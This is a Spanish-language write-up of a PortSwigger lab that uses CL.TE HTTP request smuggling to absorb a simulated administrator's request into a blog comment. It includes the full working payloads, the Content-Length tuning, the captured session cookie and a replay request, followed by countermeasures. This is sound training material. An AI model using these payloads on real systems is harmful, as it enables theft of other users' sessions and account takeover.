# Writeup: Exploiting HTTP request smuggling to capture other users' requests (PortSwigger)

- **Lab**: Exploiting HTTP request smuggling to capture other users' requests
- **URL**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
- **Categoría**: HTTP Request Smuggling / CL.TE desync / Cross-user session hijacking via persistent absorption
- **Dificultad**: Practitioner

---

## 1. Objetivo

Lab CL.TE de explotación cross-user. El blog tiene comentarios persistentes en cada post. Hay que:

1. Smugglear un `POST /post/comment` con `comment=` como último campo y `Content-Length` grande para absorber la próxima request del víctima como body del comentario.
2. Esperar que el víctima (administrator simulado) browsee el lab.
3. Leer el comentario almacenado, extraer su `Cookie: session=...`.
4. Usar esa cookie para acceder a `/my-account` como administrator.

Cookie del víctima capturada en esta sesión: **`s051Mh8CrrJKtKT2dpIOmf9Ft5TT9YCl`** (32 chars, sesión del usuario `administrator`).

Payload final (HTTP/1.1, Update-Content-Length desactivado):

```http
POST / HTTP/1.1
Host: 0a59003e03b985ed8007530a00c60024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=gBNS3CXZBSDnlbVzu85nUEyPMFz4nmi0
Content-Type: application/x-www-form-urlencoded
Content-Length: 950

csrf=9QNnqxQ8y9KiwOVuUBHYpRok266yH3w9&postId=7&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

Mandar **una sola vez**. Esperar 30-60s sin tocar el lab. Reload `/post?postId=7`. Si capturó, ver comentario nuevo con el request del víctima. Si la sesión está completa (32 chars), pegarla en `/my-account` con `Cookie: session=<value>` → lab solved.

### Insight central

**Esta lab combina la primitiva de absorción de bytes (visto en reveal-front-end-request-rewriting) con un endpoint persistente cross-user para el primer ataque cross-user de la serie**. Cambia el endpoint reflexivo por uno con storage permanente. La víctima no solo refleja en HTML inmediato — su request queda guardada en la base de datos del blog como un comentario, accesible para cualquier visitante del post.

Insight operacional: el back-end **trunca la absorción por timeout**, no por bytes-perfect. Cuántos bytes capturás varía iteración por iteración (típicamente 700-820 raw del víctima). Hay que iterar hasta que una corrida capture suficientes bytes para incluir el session value completo (32 chars). En esta resolución hicieron falta varios intentos antes de capturar los 819 bytes que contenían el cookie completo.

---

## 2. Recon y resolución

### 2.1 Reconnaissance del endpoint de comentarios

Submit de un comentario normal en el blog para capturar su estructura:

```http
POST /post/comment HTTP/2
Host: 0a59003e03b985ed8007530a00c60024.web-security-academy.net
Cookie: session=gBNS3CXZBSDnlbVzu85nUEyPMFz4nmi0
Content-Type: application/x-www-form-urlencoded
Content-Length: 97

csrf=9QNnqxQ8y9KiwOVuUBHYpRok266yH3w9&postId=7&comment=Comment&name=Name+1&email=a%40b.c&website=
```

Campos requeridos por el back-end:
- `csrf` — token CSRF atado a la sesión.
- `postId` — qué post comentar.
- `comment` — el texto.
- `name`, `email`, `website` — metadata del autor.

Comentario renderizado en `/post?postId=7`:

```html
<div class="comment-container">
    <p>Comment text</p>
    <h4 class="title">Name 1</h4>
    ...
</div>
```

Importante: el comment se renderea en `<p>...</p>` con HTML escaping de `"`, `<`, `>`, `&`. CRLF se preservan literalmente.

### 2.2 Setup de Burp y Python helper

1. Capturar POST /post/comment, mandar al Repeater.
2. Downgrade a HTTP/1.1.
3. Settings del Repeater → desmarcar "Update Content-Length".

Para automatización (300 iteraciones tomarían horas en Burp manual), se escribió un Python helper que manda el smuggle por raw socket TLS (las libs `requests`/`httpx` rechazan CL+TE simultáneos), espera, fetchea el post y parsea el último comentario buscando `session=...`. Ver `smuggle_capture.py` y `test_sockets.py` en este directorio.

### 2.3 Estructura del smuggle CL.TE

```http
POST / HTTP/1.1
Host: 0a59003e03b985ed8007530a00c60024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275                    ← outer CL: bytes del body forwardeados
Transfer-Encoding: chunked              ← back-end usa esto, frontend usa CL

0                                       ← chunked terminator (5 bytes con CRLF)

POST /post/comment HTTP/1.1            ← smuggled request line
Cookie: session=...                    ← cookie nuestra (autoriza el comment POST)
Content-Type: application/x-www-form-urlencoded
Content-Length: 950                    ← inner CL: body que el back-end espera leer

csrf=...&postId=7&...&comment=test     ← provisto: 119 bytes del body
                                        ← absorbido: 950-119 = 831 bytes del proximo request
```

Conteo del outer body (CL=275):

| Línea | Bytes | Acum |
|---|---|---|
| `0\r\n` | 3 | 3 |
| `\r\n` (chunked terminator end) | 2 | 5 |
| `POST /post/comment HTTP/1.1\r\n` | 29 | 34 |
| `Cookie: session=...\r\n` | 50 | 84 |
| `Content-Type: application/x-www-form-urlencoded\r\n` | 49 | 133 |
| `Content-Length: 950\r\n` | 21 | 154 |
| `\r\n` (sep headers/body smuggled) | 2 | 156 |
| `csrf=...&comment=test` (119 bytes) | 119 | **275** |

Outer `Content-Length: 275`.

### 2.4 Decisiones de diseño del payload

- **Outer apunta a `/`** (no a `/post/comment`): la solución oficial de PortSwigger usa `/`. La razón empírica: con outer a `/post/comment`, el back-end devuelve 400 (body chunked vacío al endpoint de comments), lo que puede afectar el comportamiento del front-end al cerrar/reusar la conexión back-end. Con outer a `/`, el back-end devuelve 200 y mantiene la conexión abierta más tiempo, dándole al smuggle más oportunidad de absorber bytes.
- **Smuggled SIN `Host` header**: el back-end usa el Host del outer. Ahorra ~65 bytes en el outer body.
- **`comment=` al FINAL del body**: para que los bytes absorbidos extiendan su valor (form parser lee comment value desde después de `=` hasta el primer `&` o EOF).
- **`comment=test` como prefix**: placeholder corto para no contaminar mucho el campo. El valor real almacenado será `test` + bytes absorbidos.
- **`Content-Length: 950` interno**: ~120 bytes más que el tamaño típico del request del víctima (~830 bytes). Si fuera menor, captura incompleto. Si fuera mucho mayor, el back-end espera bytes que no llegan, se cuelga, y subsecuentes requests se ven afectadas.

### 2.5 Iteraciones reales: variabilidad de la absorción

Captures observadas a lo largo de la resolución (mismas request, distintas iteraciones, mismo CL=950):

| Iteración | Bytes raw capturados | Hasta dónde llega el session |
|---|---|---|
| 1-2 | 745-790 | corta antes de `session=` |
| 3 | 795 | `session=s051Mh8CrrJKtKT2dpIOmf9F` (24 chars) |
| 5 | 805 | `session=s051Mh8CrrJKtKT2dpIOmf9Ft5TT9Y` (30 chars) |
| 7 | 819 | `session=s051Mh8CrrJKtKT2dpIOmf9Ft5TT9YCl` (32 chars) ✓ FULL |

La variabilidad es real: el back-end tiene un timeout de body read que se dispara después de un tiempo variable (probablemente segundos desde la última actividad de socket). Si la victim arriva justo antes del timeout, se absorben más bytes. Si arriva justo después de bytes huérfanos en buffer, menos.

### 2.6 Tropiezos al iterar

- **"Server Error: Communication timed out"** en el browser cuando reloadeás `/post?postId=7` después del smuggle: significa que el smuggle aún espera body bytes y tu reload se absorbió como continuación, dejando al frontend esperando una response que no llega. Solución: esperar 60+ segundos antes de reloadeár, o que el back-end timea y procesa con lo que tenga.
- **Captura de tu propio request en lugar del víctima**: si reloadeás demasiado rápido después del smuggle, tu request browsea antes que la víctima y se absorbe. User-Agent del comentario almacenado va a ser el tuyo (Brave, no `(Victim)`). Iterá de nuevo y esperá más.
- **Session aparente más corta que 32 chars**: cuando la captura corta antes del fin del session value, parece que la sesión es más corta. Comparar con sesiones nuevas que el back-end emite via `Set-Cookie: session=...` (siempre 32 chars en PortSwigger) confirma que la captura está truncada y hay que iterar más.

### 2.7 Test final con la cookie completa

Una vez capturado `s051Mh8CrrJKtKT2dpIOmf9Ft5TT9YCl` completo, request a `/my-account`:

```http
GET /my-account HTTP/1.1
Host: 0a59003e03b985ed8007530a00c60024.web-security-academy.net
Cookie: session=s051Mh8CrrJKtKT2dpIOmf9Ft5TT9YCl
```

Response:

```html
<h1>My Account</h1>
<p>Your username is: administrator</p>
```

Lab solved. La víctima era `administrator`.

---

## 3. Por qué funciona

### 3.1 Anatomía de la absorción cross-user

```
Cliente (atacante) → Front-end (CL=275) → Back-end (TE chunked), conexión TCP keep-alive
Víctima → Front-end → Back-end (misma conexión back-end del pool)
```

**Frontend (CL=275)**:
- Lee 275 bytes del body del outer.
- Forwardea outer headers + 275 bytes al backend.

**Backend (TE chunked)**:
- Parsea chunked: `0\r\n\r\n` → body terminado en byte 5.
- Responde a `POST /` con la home (200 OK).
- Bytes restantes en buffer (270 bytes): el smuggled `POST /post/comment` con headers + 119 bytes body provisto.

**Backend procesa el smuggled `POST /post/comment`**:
- Lee request line + headers (156 bytes consumidos).
- Body del smuggled: necesita CL=950 bytes. Ya tiene 119 bytes provistos (`csrf=...&comment=test`). Faltan 831 bytes.
- Backend bloquea esperando body bytes.

**Víctima browsea el lab** (cada ~10 segundos):
- Su request `GET / HTTP/1.1` con headers + cookies se forwardea por el front-end al back-end, en la misma conexión back-end del pool donde está el smuggle pendiente.
- Sus bytes (~830 raw) se absorben como continuación del body del smuggled.

**Backend procesa**:
- Cuando body buffer llega a 950 bytes (o timeout, lo que pase primero):
- Parsea form: `csrf=...`, `postId=7`, `name=Carlos Montoya`, `email=carlos@normal-user.net`, `website=`, `comment=test<bytes-de-victim-decoded>`.
- Crea el comentario con valor `comment` = `test` + primer ~810 bytes del request del víctima (URL-decoded).
- Responde 302 a `/post/comment/confirmation?postId=7`. La response va al front-end y de ahí al "cliente" (que en este caso es la víctima — ella ve la página de confirmación de comentario en lugar de la home).

**Atacante visita `/post?postId=7` después**:
- Ve el comentario nuevo conteniendo el request completo del víctima incluyendo `cookie: ...; session=<value>`.
- Extrae el session value y lo usa para autenticarse como víctima.

### 3.2 Por qué el `Content-Length: 950` interno es el parámetro crítico

Es el único parámetro que decide cuántos bytes del víctima se capturan:

- **CL chico (ej. 400 oficial)**: si el víctima tiene request de 830 bytes pero CL solo absorbe 281 (400-119), captura solo el inicio (request line + primeros headers). NO llega al `cookie:` que está al final. Lab no resuelve.
- **CL apropiado (ej. 950)**: absorbe 831 bytes. Si el víctima request es ~830 bytes, capturamos casi todo incluyendo el cookie.
- **CL excesivo (ej. 1500)**: absorbe budget de 1381 bytes. Pero el back-end timea antes de recibir tantos. Subsecuentes requests del cliente atacante se absorben como continuación, lo que rompe el flujo (browser ve "Communication timed out", smuggle nunca se completa limpio).

El valor óptimo es **un poco más grande que el request total del víctima**. En este lab, el víctima tiene ~830 bytes con headers Sec-Ch-Ua-* modernos. CL=950 es óptimo. La solución oficial dice CL=400 — eso fue válido cuando el lab tenía un víctima más simple (~400 bytes); con el víctima actualizado, CL=400 captura solo headers iniciales y NO el cookie.

### 3.3 Por qué la absorción es variable iteración a iteración

El back-end tiene timeout de body read (probable 5-30 segundos). Cuando llegan los bytes del víctima (~830), el back-end consume y queda esperando 120 más para llegar a CL=950. Esos 120 NO llegan inmediatamente (el front-end ya forwardeó la victim request, no hay siguientes requests inmediatas en la conexión). El back-end timea después de X segundos y procesa con los bytes que tenga.

Cuántos bytes haya recibido depende de:
- Velocidad de transmisión de la victim request (TCP windowing).
- Si el front-end ya cerró la conexión TCP (Connection: close fuerza EOF).
- Si otra request llegó entre medio (la rellena más).

Por eso vemos captures que oscilan entre 745-820 bytes raw entre iteraciones del MISMO payload exacto. La iteración exitosa es la que captura ≥819 bytes (donde el cookie completo cae).

### 3.4 Diferencia entre los 3 endpoints de captura del cluster

| Aspecto | Reveal request rewriting | Capture other users' requests |
|---------|--------------------------|-------------------------------|
| Endpoint absorbido | `POST /` con campo `search` reflexivo | `POST /post/comment` con campo `comment` persistente |
| Visibilidad del leak | Reflejada en response 2 inmediata | Almacenada en DB, accesible vía page reload |
| Víctima | El propio cliente atacante (request 2 = nuestro) | Usuario simulado (administrator) que browsea |
| Cross-user | No (capturamos nuestros propios headers) | Sí (capturamos cookie de OTRO usuario) |
| Iteraciones para success | 1-2 (predictible) | 5-20 (timing variable de la víctima) |
| Severidad real | Medium (info disclosure de headers internos) | Critical (account takeover) |

Este lab es la versión "weaponizada" del de leak: misma primitiva, target real (account takeover de admin) en lugar de info de headers internos.

### 3.5 Por qué la solución oficial está desactualizada

La solución oficial de PortSwigger usa `Content-Length: 400`. Funciona si el víctima simulado tiene ~400 bytes raw de request. La versión actual del víctima (Mayo 2026) usa `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36` con headers `sec-ch-ua-*`, `sec-fetch-*`, `priority`, etc. — total ~830 bytes. CL=400 captura solo los primeros 281 bytes (después del provisto), que llega aproximadamente hasta `accept:` — **antes** de la cookie.

Lección operacional: cuando la solución oficial no funciona, no asumir que está mal el procedimiento — chequear si el victim simulator cambió y los CL estimados ya no aplican. Iterativamente subir CL hasta capturar el cookie.

### 3.6 Comparación con cross-user persistent attacks clásicos

Este patrón (smuggle a endpoint persistente que captura request de otro usuario) es funcionalmente equivalente a:

1. **Stored XSS con session theft**: víctima ejecuta JS atacante en su contexto, manda cookie a atacante. Acá: víctima request entera (incluyendo cookie) se almacena en DB para que atacante lea.
2. **CSRF + reflexión**: víctima hace request con sus credenciales que el back-end refleja. Acá similar pero la "reflexión" es persistente (storage en DB).
3. **HTTP request smuggling clásico de cache poisoning**: response de víctima se cachea para servir a atacante. Acá: request de víctima se almacena en DB para servir a atacante.

Diferencia clave de smuggling vs los otros: NO requiere que la víctima ejecute código del atacante (XSS) ni que haga click en un link (CSRF). Solo necesita que la víctima browsee normalmente — el smuggling intercepta sus bytes en la capa HTTP transparentemente. Más sigiloso y harder to detect.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Capturar POST /post/comment legitimo - identificar campos]
    B[2. Smuggle POST / outer + POST /post/comment inner CL=950]
    C[3. Backend acepta outer 200, smuggle queda esperando body]
    D[4. Esperar 30-60s sin tocar el lab]
    E[5. Victim simulado browsea, sus bytes absorbidos como body]
    F[6. Backend procesa smuggled, comment field = test+victim_bytes]
    G[7. Iterar varias veces - captura varia entre 745-820 bytes raw]
    H[8. Cuando captura llega a 819+ bytes, cookie completo presente]
    I[9. Extraer session value de 32 chars, usar en /my-account]
    J[10. Response Your username is: administrator - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I --> J
```



Tres ideas:

1. **El smuggle CL.TE puede convertirse en cross-user persistent attack si el endpoint absorbido tiene storage permanente**. El comment field del blog es el vector ideal: persistente, accesible para cualquier visitante, sin escaping de los caracteres especiales que importan (CRLF, `;`, etc.). La primitiva de absorción (CL grande + comment último) es idéntica a la del leak vía reflexión, pero el alcance del impacto es radicalmente distinto: account takeover en lugar de info leak.

2. **La cantidad de bytes absorbida varía iteración por iteración por timeouts del back-end**. NO es un parámetro determinístico; depende de timing TCP, del momento en que llega la víctima, del comportamiento de pool del front-end. Iterar 10-20 veces con el mismo payload típicamente captura distintos snapshots — uno de ellos eventualmente incluye el cookie completo. La estrategia es iterar con paciencia, no buscar el "CL perfecto".

3. **Las soluciones oficiales de PortSwigger pueden estar desactualizadas frente a victim simulators evolucionados**. La oficial dice CL=400 (víctima ~400 bytes). El víctima 2026 tiene ~830 bytes con headers Sec-Ch-Ua-* modernos. CL=400 falla porque captura solo los primeros 281 bytes — antes de llegar al cookie. Hay que ajustar CL al tamaño real del víctima actual. Cuando una solución oficial "no funciona", el bug suele estar en parámetros, no en la técnica.

---

## 5. Contramedidas

1. **HTTP/2 entre frontend y backend**: bodies framed binariamente, sin ambigüedad CL/TE. Cierra smuggling por construcción. Defensa estructural.
2. **Rechazar requests con CL y TE simultáneos en el frontend**: respondiendo 400. RFC 9112 lo permite. Más seguro que normalizar.
3. **No persistir requests crudas de usuarios en endpoints accesibles**: el comment field debería sanitizar/escapar el input para que CRLFs no aparezcan literales. Pero más importante: incluso con escaping, almacenar el request entero en una DB visible es un anti-pattern porque cualquier desync HTTP lo expone.
4. **CSP y SameSite=Strict en cookies de sesión**: SameSite=Strict no previene smuggling pero limita el impacto del session theft (cookies no viajan en cross-origin requests). En este lab, SameSite=None está explícitamente seteado en las cookies emitidas — vulnerable por diseño.
5. **Rotación frecuente de session tokens** + **detection de geo/UA mismatch**: si el back-end detecta que una cookie se usa desde un User-Agent o IP muy distinto al que la creó, invalidar. Detecta session hijacking post-hoc.
6. **Sin keep-alive entre frontend y backend**: cada request del frontend al backend abre conexión nueva. Bytes smuggled no encuentran socket compartido. Costo: latencia + file descriptors.
7. **Backend con parser HTTP estricto**: rechazar `Transfer-Encoding` con valores no estándar, headers duplicados, encodings obfuscados.
8. **Validación de Origin/Referer en endpoints sensibles** como `/post/comment`: incluso si el comment se procesa, requerir Origin/Referer del propio dominio (no solo CSRF token). En este lab, el smuggled comment POST viene "desde dentro" (HTTP framing internal), bypassa Origin checks.
9. **Logging y alerting de patrones HTTP en bodies de form data**: un comment field cuyo valor empieza con `GET / HTTP/1.1\r\n` es signal de smuggling exitoso o intento. Alertar SOC.
10. **Comment storage con max length corto** (ej. 500 bytes) + **rate limit por usuario**: limita la cantidad de bytes del víctima que se pueden capturar en un solo comment, y limita la frecuencia con que un atacante puede enviar smuggles. Defensa-en-profundidad.
11. **Tests de regresión con `smuggler.py` o Burp Smuggler en CI**: detecta regresiones cuando infraestructura cambia.
12. **Connection: close en respuestas si el frontend detecta length mismatch** entre lo forwardeado y lo que el backend reporta. Limita el daño aunque el smuggling pase.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Exploiting HTTP request smuggling to capture other users' requests*. https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
- PortSwigger Web Security Academy. (s.f.). *HTTP request smuggling*. https://portswigger.net/web-security/request-smuggling
- PortSwigger Research. (2019). *HTTP Desync Attacks: Request Smuggling Reborn* (James Kettle). https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- IETF. (2022). *RFC 9112: HTTP/1.1*. https://datatracker.ietf.org/doc/html/rfc9112 (sección 6.3 Message Body Length)
- OWASP Foundation. (s.f.). *HTTP Request Smuggling*. https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
- MITRE Corporation. (2024). *CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')*. https://cwe.mitre.org/data/definitions/444.html
- MITRE Corporation. (2024). *ATT&CK Technique T1190: Exploit Public-Facing Application*. https://attack.mitre.org/techniques/T1190/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Request Smuggling*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- defparam. (s.f.). *smuggler — HTTP Request Smuggling detection tool* [Software]. GitHub. https://github.com/defparam/smuggler
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 17 (Attacking Application Architecture).
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md)
- Writeup detección CL.TE: [`learning/portswigger/confirming-cl-te-via-differential-responses/writeup.md`](../confirming-cl-te-via-differential-responses/writeup.md)
- Writeup CL.TE bypass `/admin`: [`learning/portswigger/bypass-front-end-controls-cl-te/writeup.md`](../bypass-front-end-controls-cl-te/writeup.md)
- Writeup TE.CL bypass `/admin`: [`learning/portswigger/bypass-front-end-controls-te-cl/writeup.md`](../bypass-front-end-controls-te-cl/writeup.md)
- Writeup reveal front-end request rewriting: [`learning/portswigger/reveal-front-end-request-rewriting/writeup.md`](../reveal-front-end-request-rewriting/writeup.md)
- Helper scripts en este directorio: `test_sockets.py` (validación TLS+HTTP/1.1 raw socket), `smuggle_capture.py` (auto-iteración del exploit con parsing del comment).
